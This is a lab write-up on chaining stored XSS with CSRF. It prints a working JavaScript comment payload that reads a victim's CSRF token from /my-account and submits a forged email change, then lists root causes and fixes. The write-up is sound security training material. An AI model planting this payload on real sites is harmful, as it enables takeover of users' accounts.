Lab: Exploiting XSS to Bypass CSRF Defenses
Difficulty: Practitioner

This one’s about chaining stored XSS with CSRF. The idea is to abuse stored XSS to steal a CSRF token from a victim and then use it to change their email. Pretty classic combo.

Logged in as wiener:peter and went to the account settings. There’s a form to change your email address. I checked the HTML source and saw it uses a CSRF token in a hidden input:


<input type="hidden" name="csrf" value="sometoken">
The form sends a POST request to /my-account/change-email with two parameters: csrf and email.

So basically, to pull this off, I needed a payload that:

Triggers when someone views a comment

Loads /my-account in the background

Scrapes the CSRF token from the response

Sends a forged POST request with the token and a new email

Here’s the payload I used in a blog comment:


<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('GET', '/my-account', true);
req.send();

function handleResponse() {
  var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
  var changeReq = new XMLHttpRequest();
  changeReq.open('POST', '/my-account/change-email', true);
  changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  changeReq.send('csrf=' + token + '&email=test@test.com');
}
</script>
Posted that as a comment. Then waited for Carlos to view the post. Once he does, his browser hits /my-account, grabs his CSRF token, and submits a request to change his email to test@test.com.

It worked. Email updated, lab solved.

Root Cause

Stored XSS lets me run arbitrary JS in another user’s session

The app uses CSRF tokens, but they’re exposed in the HTML — and JS can access them

There's no SameSite protection or other mitigations, so it's wide open for abuse

Fixes

Sanitize user input to block stored XSS

Use SameSite cookies to help mitigate CSRF

Consider double-submit cookies or other CSRF protections that don’t rely on reading tokens from the DOM

Don't let sensitive actions happen silently through JavaScript like this
